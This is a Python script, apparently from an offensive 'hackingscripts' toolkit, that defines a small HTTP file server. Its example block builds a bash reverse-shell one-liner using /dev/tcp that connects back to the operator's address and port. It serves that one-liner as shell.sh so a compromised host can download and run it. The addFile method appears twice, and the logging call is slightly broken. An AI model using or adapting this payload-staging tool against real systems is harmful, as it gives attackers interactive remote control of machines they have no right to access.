#!/usr/bin/env python

from hackingscripts import util
from http.server import BaseHTTPRequestHandler, HTTPServer
import threading
import sys

class FileServerRequestHandler(BaseHTTPRequestHandler):

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)

    def do_GET(self):
        if self.path in self.server.files:
            data = self.server.files[self.path]
            self.send_response(200)
            self.end_headers()
            self.wfile.write(data)
        else:
            self.send_response(404)
            self.end_headers()

    def log_message(self, format, *args):
        if self.server.logRequests:
            BaseHTTPRequestHandler.log_message(format, *args)

class HttpFileServer(HTTPServer):
    def __init__(self, addr, port):
        super().__init__((addr, port), FileServerRequestHandler)
        self.logRequests = False
        self.files = { }

    def addFile(self, name, data):
        if isinstance(data, str):
            data = data.encode("UTF-8")
        if not name.startswith("/"):
            name = "/" + name
        self.files[name.strip()] = data

    def addFile(self, name, data):
        if isinstance(data, str):
            data = data.encode("UTF-8")
        if not name.startswith("/"):
            name = "/" + name
        self.files[name.strip()] = data

    def startBackground(self):
        t = threading.Thread(target=self.serve_forever)
        t.start()
        return t

# EXAMPLE
if __name__ == "__main__":
    listenPort = 4444 if len(sys.argv) < 2 else int(sys.argv[1])
    ipAddress = util.getAddress()

    rev_shell = "bash -i >& /dev/tcp/%s/%d 0>&1" % (ipAddress, listenPort)
    fileServer = HttpFileServer("0.0.0.0", 80)
    fileServer.addFile("shell.sh", rev_shell)
    fileServer.startBackground()
    print("Reverse Shell URL: http://%s/shell.sh" % ipAddress)
